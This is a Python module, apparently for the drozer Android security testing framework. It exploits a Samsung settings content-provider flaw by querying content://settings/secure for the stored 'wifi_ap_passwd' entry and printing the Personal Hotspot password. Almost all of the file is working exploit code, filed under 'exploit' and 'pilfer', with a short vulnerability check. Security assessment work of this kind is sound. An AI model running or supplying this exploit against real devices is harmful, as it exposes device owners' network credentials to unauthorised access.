from drozer.modules import common, Module

class APPassword(Module, common.Provider, common.TableFormatter, common.Vulnerability):

    name = "Tests for vulnerability in content://settings/secure, that reveals Personal Hotspot AP password."
    description = "Tests for vulnerability in content://settings/secure, that reveals Personal Hotspot AP password."
    examples = ""
    author = "Tyrone (@mwrlabs)"
    date = "2012-11-06"
    license = "BSD (3 clause)"
    path = ["exploit", "pilfer", "oem", "samsung"]
    permissions = ["com.mwr.dz.permissions.GET_CONTEXT"]

    label = "Personal Hotspot AP Password (com.android.providers.settings)"
    
    def exploit(self, arguments):
        cursor = self.getCursor()

        self.print_table(self.getResultSet(cursor), vertical=True)

    def getCursor(self):
        return self.contentResolver().query("content://settings/secure", selection="name=?", selectionArgs=["wifi_ap_passwd"])

    def isVulnerable(self, arguments):
        cursor = self.getCursor()

        return cursor != None and cursor.getCount() > 0
